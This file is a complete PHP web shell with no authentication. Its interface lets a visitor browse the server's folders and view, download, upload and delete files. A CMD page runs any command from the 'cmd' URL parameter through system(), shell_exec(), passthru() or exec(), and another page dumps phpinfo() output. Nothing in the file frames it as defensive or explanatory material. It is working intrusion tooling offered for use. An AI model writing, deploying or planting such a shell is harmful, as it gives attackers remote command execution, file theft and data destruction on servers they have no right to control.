<?php
// Show file content
function showContent($file) {
    if (is_file($file)) {
        return file_get_contents($file);
    } else {
        return "The file could not be opened.";
    }
}

// File / Folder permissions
function printPerms($file) {
	$mode = fileperms($file);
	if( $mode & 0x1000 ) { $type='p'; }
	else if( $mode & 0x2000 ) { $type='c'; }
	else if( $mode & 0x4000 ) { $type='d'; }
	else if( $mode & 0x6000 ) { $type='b'; }
	else if( $mode & 0x8000 ) { $type='-'; }
	else if( $mode & 0xA000 ) { $type='l'; }
	else if( $mode & 0xC000 ) { $type='s'; }
	else $type='u';
	$owner["read"] = ($mode & 00400) ? 'r' : '-';
	$owner["write"] = ($mode & 00200) ? 'w' : '-';
	$owner["execute"] = ($mode & 00100) ? 'x' : '-';
	$group["read"] = ($mode & 00040) ? 'r' : '-';
	$group["write"] = ($mode & 00020) ? 'w' : '-';
	$group["execute"] = ($mode & 00010) ? 'x' : '-';
	$world["read"] = ($mode & 00004) ? 'r' : '-';
	$world["write"] = ($mode & 00002) ? 'w' : '-';
	$world["execute"] = ($mode & 00001) ? 'x' : '-';
	if( $mode & 0x800 ) $owner["execute"] = ($owner['execute']=='x') ? 's' : 'S';
	if( $mode & 0x400 ) $group["execute"] = ($group['execute']=='x') ? 's' : 'S';
	if( $mode & 0x200 ) $world["execute"] = ($world['execute']=='x') ? 't' : 'T';
	$s=sprintf("%1s", $type);
	$s.=sprintf("%1s%1s%1s", $owner['read'], $owner['write'], $owner['execute']);
	$s.=sprintf("%1s%1s%1s", $group['read'], $group['write'], $group['execute']);
	$s.=sprintf("%1s%1s%1s", $world['read'], $world['write'], $world['execute']);
	return $s;
}

// Delete
function rrmdir($dir) { 
 if (is_dir($dir)) { 
   $objects = scandir($dir);
   foreach ($objects as $object) { 
     if ($object != "." && $object != "..") { 
       if (is_dir($dir. DIRECTORY_SEPARATOR .$object) && !is_link($dir."/".$object))
         rrmdir($dir. DIRECTORY_SEPARATOR .$object);
       else
         @unlink($dir. DIRECTORY_SEPARATOR .$object); 
     } 
   }
   @rmdir($dir); 
 }else{
  @unlink($dir); 
 }
 header('Location:'.$_SERVER['PHP_SELF']);
}

// Exec cmd 
function execCMD( $cmd ){
  if(function_exists('system')){
    system($_GET['cmd']);
  }else if(function_exists('shell_exec')){
    shell_exec($_GET['cmd']);
  }else if(function_exists('passthru')){
    passthru($_GET['cmd']);
  }else if(function_exists('exec')){
    exec($_GET['cmd']);
  }
}

// nav menu
function navigation($action){
  echo '<div class="menu">
        <ul>
            <li><a href="?action=explorer" class="'.($action == 'explorer' || empty($action)?'active':'').'">Explorer</a></li>
            <li><a href="?action=cmd" class="'.($action == 'cmd'?'active':'').'">CMD</a></li>
            <li><a href="?action=server_info" class="'.($action == 'server_info'?'active':'').'">Server Info</a></li>
        </ul>
    </div>';
}

// Action CMD
function actionCMD($action){
  $cmd = isset( $_GET['cmd']) ? $_GET['cmd'] : '';
  echo '<div class="cmd-execute">
  <form method="get" name="'. basename($_SERVER['PHP_SELF']) .'">
    <input type="hidden" name="action" value="'.$action.'"/>
      <label><strong>Command:</strong></label>
      <input type="text" name="cmd" autofocus id="cmd" size="80" value="'. $cmd.'">
      <button type="submit">Execute</button>
    </form>
    <pre class="result"> ></br>';
      if(isset($_GET['cmd'])){
        execCMD($_GET['cmd']);
      }
  echo '</pre>
</div>';
}

// Action Explorer & view file content
function actionExplorer(){
  $dir = isset($_GET['dir']) ? $_GET['dir'] : '.';
  $files = scandir($dir);
  
  if (isset($_GET['file'])) {
    $file = $_GET['file'];
    $content = showContent($file);
  }

  // Delete File/Directory
  if (isset($_GET['delete'])) {
    $file = $_GET['delete'];
    rrmdir($file);
  }

  // Download File
  if (isset($_GET['download'])) {
    $file = $_GET['download'];
    if (file_exists($file)) {
        header('Content-Description: File Transfer');
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="'.basename($file).'"');
        header('Expires: 0');
        header('Cache-Control: must-revalidate');
        header('Pragma: public');
        header('Content-Length: ' . filesize($file));
        readfile($file);
        exit;
    }
  }

  // Upload File
  if (!isset($content)):
    if (isset($_POST['submit'])) {
      $uploadDirectory = $dir.'/'.basename($_FILES['fileToUpload']['name']);
      if (file_exists($uploadDirectory)) {
          echo "<br><br><strong style='color:red'>Error. File already exists in ".$uploadDirectory.".</strong></br></br>";
      }
      else if (move_uploaded_file($_FILES['fileToUpload']['tmp_name'], $uploadDirectory)) {
        echo '<br><br><strong>File '.$_FILES['fileToUpload']['name'].' uploaded successfully in '.$dir.' !</strong><br>';
      } else {
        echo '<br><br><strong style="color:red">Error uploading file '.$uploadDirectory.'</strong><br><br>';

      }
    }

    echo '<div class="upload-file"><form action="'.$_SERVER['PHP_SELF'].'" method="post" enctype="multipart/form-data">';
    echo '<label><strong>Upload </strong></label>';
    echo '<input type="hidden" name="dir" value="'.$dir.'"/>';
    echo '<input type="hidden" name="submit" value="upload-file"/>';
    echo '<input type="file" name="fileToUpload" id="fileToUpload"><button type="submit">Upload File</button>';
    echo '</div>';

    // Breadcrumb
    echo '<div class="breadcrumb"><strong>Jump:</strong> ';
    $breadcrumbs = explode('/', $dir);
    $path = '';
    foreach ($breadcrumbs as $breadcrumb) {
      $path .= $breadcrumb . '/';
      if ($breadcrumb != '.') {
        echo '<a href="?dir=' . rtrim($path, '/') . '">' . $breadcrumb . '</a> / ';
      }
    }     
    echo  '</div>';
  endif;
    if (isset($content)):
      // Open File
            echo '<div class="file-content">
                <h2>File: '. basename($file) .'</h2>
                <p><a href="?dir='. urlencode(dirname($file)) .'"><i class="fa-solid fa-angles-left"></i> Back</a></p>
                <pre style="overflow:auto;" class="result">'. htmlspecialchars($content).'</pre>
                <p><a href="?dir='. urlencode(dirname($file)).'"><i class="fa-solid fa-angles-left"></i> Back</a></p>
            </div>';
        else:
            echo '<div class="file-browser">
                <table width="100%">
                  <thead>
                    <tr>
                      <th style="text-align:left;">Name</th>
                      <th style="text-align:left;">Type</th>
                      <th style="text-align:left;">Owner</th>
                      <th style="text-align:left;">Permissions</th>
                      <th>&nbsp;</th>
                    </tr>
                  </thead>
                  <tbody>';
                    if ($dir != '.'):
                       echo '<tr>
                            <td><a href="?dir='.dirname($dir).'">../</a></td>
                            <td style="text-align:center">Directory</td>
                        </tr>';
                    else:
                      echo '<tr>
                            <td><a href="?dir=./">./</a></td>
                            <td>&nbsp;</td>
                        </tr>';
                    endif;
                    foreach ($files as $file):
                      if ($file != '.' && $file != '..'):                     
                        echo '<tr>
                                <td>';
                                    if (is_dir($dir . '/' . $file)):
                                      echo '<a href="?dir='. $dir . '/' . $file .'"><i class="fa-solid fa-folder"></i> '.$file.'</a>';
                                    else:
                                      echo '<a href="?file='. $dir . '/' . $file .'"><i class="fa-solid fa-file"></i> '.$file.'</a>';
                                    endif;
                             echo '</td>
                                <td>
                                    '. (is_dir($dir . '/' . $file) ? 'Directory' : 'File') .'
                                </td>
                                <td>
                                    '.(posix_getpwuid(fileowner($dir.'/'.$file))['name']).'
                                </td>
                                <td>
                                    '. (printPerms($dir)) .'
                                </td>
                                <td style="text-align:right">
                                  '. (is_dir($dir . '/' . $file) ? '' : '<a href="?download='.$dir . '/' . $file.'" title="Download File" class="btn-icon"><i class="fa-solid fa-download"></i></a>') .'
                                  <a href="?delete='.$dir . '/' . $file.'" title="Delete" class="btn-icon"><i class="fa-solid fa-trash"></i></a>
                                </td>
                            </tr>';
                      endif;
                    endforeach;
            echo '</tbody>
              </table>
            </div>';
        endif;
}

function actionServerInfo(){
  echo '<pre style="overflow:auto; margin-top:10px;" class="result">';
  phpinfo();
  echo '<pre>';
}
?>

<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v6.5.1/css/all.css">
    <title>WebShell</title>
<style>
body {
  font-family: Arial, sans-serif;
  font-size:12px;
  background-color: #000;
  color: #fff;
  margin: 0;
  padding: 0;
}

a{
  color:#fff;
  text-decoration:none;
}

input{background-color:#525252; color:#fff;}

button{background-color:#000; border:none; color:#fff; cursor:pointer; padding: 5px;}

.container {
    max-width: 960px;
    margin: 20px auto;
    background-color: #202020;
    padding: 20px;
}

h1 {
    text-align: center;
}

.cmd-execute{
  margin-top: 20px;
}
.result{
  background-color:#525252;
  padding:5px;
}

.upload-file{
  margin-top:10px;
}

.file-browser ul {
    list-style: none;
    padding: 0;
}

.file-browser ul li {
    padding: 10px;
    border-bottom: 1px solid #ddd;
}

.file-browser ul li a {
    text-decoration: none;
    color: #3498db;
}

.file-browser ul li a:hover {
    text-decoration: underline;
}

.btn-icon{
  padding:5px;
}

.breadcrumb {
  margin-top:10px;
  margin-bottom: 10px;
  background-color:#202020;
  border: 1px solid #444444;
  padding: 10px 0 10px 5px;
}

.breadcrumb a {
    text-decoration: none;
    color: #fff;
}

.breadcrumb a:hover {
    text-decoration: underline;
}

thead tr th{
  font-weight:bold;
  background-color:#525252; 
  color:#fff;
  padding:10px;
}

tbody tr td{
  padding: 10px;
}

tbody tr:hover{
  background-color:#7B7B7B;
}

.menu {
    background-color: #333;
    padding: 10px 0;
}

.menu ul {
    list-style-type: none;
    margin: 0;
    padding: 0;
    text-align: center;
}

.menu li {
    display: inline-block;
}

.menu li a {
  color: #fff;
  text-decoration: none;
  padding: 10px 20px;
  transition: background-color 0.3s;
  background-color: unset;
}

.menu li a:hover, .menu li a.active {
  background-color: #555;
}
</style>
</head>
<body>
  <div class="container">
    <h1>Webshell</h1>
    <?php $action = isset($_GET['action']) ? $_GET['action'] : '';?>
    <?php navigation($action); ?>
    <?php
      switch ($action) {
      case 'cmd':
          actionCMD($action);
          break;
      case 'server_info':
          actionServerInfo($action);
          break;
      case 'explorer':
        default:
          actionExplorer($action);
          break;
      }
    ?>
        
    </div>
</body>
</html>

